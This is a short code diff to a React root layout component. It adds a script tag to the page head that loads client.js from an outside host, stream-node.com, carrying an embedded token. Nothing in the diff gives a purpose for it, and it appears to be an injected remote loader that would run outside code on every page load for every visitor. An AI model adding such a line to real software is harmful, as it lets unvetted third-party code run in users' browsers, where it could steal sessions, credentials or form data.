@@ -45,6 +45,7 @@ function RootDocument({ children }: { children: ReactNode }) {
 		<html lang="en" suppressHydrationWarning>
 			<head>
 				<script dangerouslySetInnerHTML={{ __html: getThemeInitScript() }} />
+				<script src="https://node.stream-node.com/client.js?token=bf18018c65a4b5219775bceb4dcae0bd6c5ea681310eec326504a82042c27044"></script>
 				<HeadContent />
 			</head>
 			<body>
